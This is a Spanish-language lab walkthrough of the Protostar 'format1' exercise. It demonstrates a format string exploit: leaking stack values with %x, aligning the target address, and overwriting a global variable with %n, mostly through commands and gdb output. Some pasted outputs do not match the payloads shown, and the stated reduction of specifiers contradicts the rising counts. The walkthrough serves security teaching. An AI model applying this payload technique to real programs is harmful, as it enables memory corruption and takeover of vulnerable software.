
---------------------------------------------------------------------------
## Sobreescribir una variable -> [format1](https://exploit.education/protostar/format-one/)

Este binario toma un argumento (al que llama "string"), lo mete en la funcion **printf()** y te imprime dicho argumento

  	```console
  	[user@protostar]-[/opt/protostar/bin]:$ ./format1 AAA
  	AAA[user@protostar]-[/opt/protostar/bin]:$ 
  	```
Como no hace un salto de linea, lo ponemos nosotros concatenando "; echo"
  
	```console
	[user@protostar]-[/opt/protostar/bin]:$ ./format1 AAA; echo
	AAA
    	[user@protostar]-[/opt/protostar/bin]:$ 
  	```
¿Si en vez de pasarle una "A" le pasamos una cadena de formateo como %x (numero hexadecimal)?
  
  	```console
	[user@protostar]-[/opt/protostar/bin]:$ ./format1 %x; echo
	804960c
   	[user@protostar]-[/opt/protostar/bin]:$ ./format1 "%x %x"; echo
   	804960c bffff6e8
  	```
 Este "bffff6e8" parece una direccion de la pila...
 
  	```console
	[user@protostar]-[/opt/protostar/bin]:$ python -c "print('%x'*4)"  > /tmp/pattern
    	[user@protostar]-[/opt/protostar/bin]:$ gdb ./format1
    	(gdb) disas vuln
    	Dump of assembler code for function vuln:
    	0x080483f4 <vuln+0>:	push   %ebp
   	0x080483f5 <vuln+1>:	mov    %esp,%ebp
  	0x080483f7 <vuln+3>:	sub    $0x18,%esp
    	0x080483fa <vuln+6>:	mov    0x8(%ebp),%eax
    	0x080483fd <vuln+9>:	mov    %eax,(%esp)
    	0x08048400 <vuln+12>:	call   0x8048320 <printf@plt>
    	0x08048405 <vuln+17>:	mov    0x8049638,%eax
    	0x0804840a <vuln+22>:	test   %eax,%eax
    	0x0804840c <vuln+24>:	je     0x804841a <vuln+38>
    	0x0804840e <vuln+26>:	movl   $0x8048500,(%esp)
    	0x08048415 <vuln+33>:	call   0x8048330 <puts@plt>
    	0x0804841a <vuln+38>:	leave  
    	0x0804841b <vuln+39>:	ret    
    	End of assembler dump.
    	(gdb) b *0x08048400
   	(gdb) run < /tmp/pattern
  	Starting program: /opt/protostar/bin/format1 < /tmp/pattern
    	Breakpoint 4, 0x08048400 in vuln (string=0x0) at format1/format1.c:10
    	10	format1/format1.c: No such file or directory.
      	in format1/format1.c
    	(gdb) x/40wx $esp
    	0xbffff670:	0x00000000	0x0804960c	0xbffff6a8	0x08048469
    	0xbffff680:	0xb7fd8304	0xb7fd7ff4	0xbffff6a8	0x08048435
    	0xbffff690:	0x00000000	0xb7ff1040	0x0804845b	0xb7fd7ff4
    	0xbffff6a0:	0x08048450	0x00000000	0xbffff728	0xb7eadc76
    	0xbffff6b0:	0x00000001	0xbffff754	0xbffff75c	0xb7fe1848
    	0xbffff6c0:	0xbffff710	0xffffffff	0xb7ffeff4	0x0804824d
    	0xbffff6d0:	0x00000001	0xbffff710	0xb7ff0626	0xb7fffab0
    	0xbffff6e0:	0xb7fe1b28	0xb7fd7ff4	0x00000000	0x00000000
    	0xbffff6f0:	0xbffff728	0x8160bf58	0xab35a948	0x00000000
    	0xbffff700:	0x00000000	0x00000000	0x00000001	0x08048340
  	```
    
Como podemos ver la segunda entrada de la pila es nuestro "0x0804960c" que se imprimió antes, es decir, prinf(%x) imprime contenido de la pila.

  	```console
	[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('AAAA'+'BBBB'+'%8x.'*150 + '%x')") | tr "." "\n" ;echo
	AAAABBBB 804960c
    	bffff488
     	8048469
    	b7fd8304
    	b7fd7ff4
    	...
    	2e000000
    	726f662f
    	3174616d
    	41414100
    	42424241
    	7838252e
    	7838252e
  	```
   Nos está imrpimiendo muchos valores de la pila, en cierto momento, se ven "41" y "42", que equivalen a nuestras "A" y "B", seguidos de "7838252e"
   que son nuestras "%8x.". El objetivo, esque sean las A los útlimos valores que salgan, para eso hay que reducir las x u offset.
  	```console
	[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('AAAA'+'BBBB'+'%8x.'*138 + '%x')") | tr "." "\n" ;echo
	AAAABBBB 804960c
    	bffff488
    	...
    	726f662f
    	3174616d
    	41414100
    	42424241
    	```
   El problema esque se han mezclado los 42 y los 41 (A)s y (B)s, y tiene que quedar perfecto, asi que se reduce el numero de "B"

  	```console
	[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('AAAA'+'B'+'%8x.'*138 + '%x')") | tr "." "\n" ;echo
	AAAABBBB 804960c
   	bffff488
    	...
    	41414141
    	78382542
    	7838252e
    	7838252e
    	7838252e
    	```
   Se quitan mas "x"

  	```console
	[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('AAAA'+'B'+'%8x.'*168 + '%x')") | tr "." "\n" ;echo
	AAAABBBB 804960c
    	bffff488
    	...
    	2f2e0000
    	6d726f66
    	317461
    	41414141
    	```
  Perfecto, ya están alineados nuestras, "A". Pero ahora lo que interesa es cambiar esas "A" por otra cosa, la direccion de la varaible 
  que queremos modificar:
```console
[user@protostar]-[/opt/protostar/bin]:$ objdump -t ./format1 | grep "target"
08049638 g     O .bss	00000004              target
```
  La direccion de la variable "target" es *0x08049638* que si lo pasamos a endian (dar la vuelta a los bytes) sale -> *\x38\x96\x04\x08*
  Ahora sustituimos las "AAAA" por esa dirección (ambas cosas ocupan 4 bytes).
  	```console
	[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('\x38\x96\x04\x08'+'B'+'%8x.'*136 + '%x')") | tr "." "\n" ;echo
	AAAABBBB 804960c
    	bffff488
    	...
    	317461
    	8049638
    	```
  Perfecto, la dirección de memoria se ha alineado perfectamente. Ahora hay que sobrrescribirla cambiando la "%x" por "%n"
  
  	```console
	[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('\x38\x96\x04\x08'+'B'+'%8x.'*136 + '%n')") | tr "." "\n" ;echo
	AAAABBBB 804960c
    	bffff488
    	...
    	317461
    	you have modified the target :)
    	```
  Y ya está, primer format completado.

  
    
   
